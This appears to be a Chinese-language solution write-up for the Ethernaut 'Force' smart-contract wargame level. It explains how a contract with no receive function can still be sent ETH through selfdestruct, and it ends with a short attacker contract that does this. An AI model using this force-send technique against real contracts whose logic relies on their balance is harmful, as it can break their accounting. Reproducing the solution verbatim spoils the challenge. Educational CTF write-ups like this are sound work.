# Force

## 要求:
```
有些合约就是拒绝你的付款,就是这么任性 ¯\_(ツ)_/¯

这一关的目标是使合约的余额大于0

  这可能有帮助:

Fallback 方法
有时候攻击一个合约最好的方法是使用另一个合约.
阅读上方的帮助页面, "Beyond the console" 部分
```

## 代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```


## 思路

这个就是没有接收函数的合约，可以使用`selfdestruct`函数。


`selfdestruct`命令可以用来删除智能合约，并将该合约剩余ETH转到指定地址。`selfdestruct`是为了应对合约出错的极端情况而设计的。它最早被命名为suicide（自杀），但是这个词太敏感。为了保护抑郁的程序员，改名为`selfdestruct`；在 v0.8.18 版本中，`selfdestruct` 关键字被标记为「不再建议使用」，在一些情况下它会导致预期之外的合约语义，但由于目前还没有代替方案，目前只是对开发者做了编译阶段的警告，相关内容可以查看 [EIP-6049](https://eips.ethereum.org/EIPS/eip-6049)。


## pwn
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForcePwn{
    constructor() payable {

    }
    function pwn(address  payable  target) public{
        selfdestruct(payable(target));
    }
}
```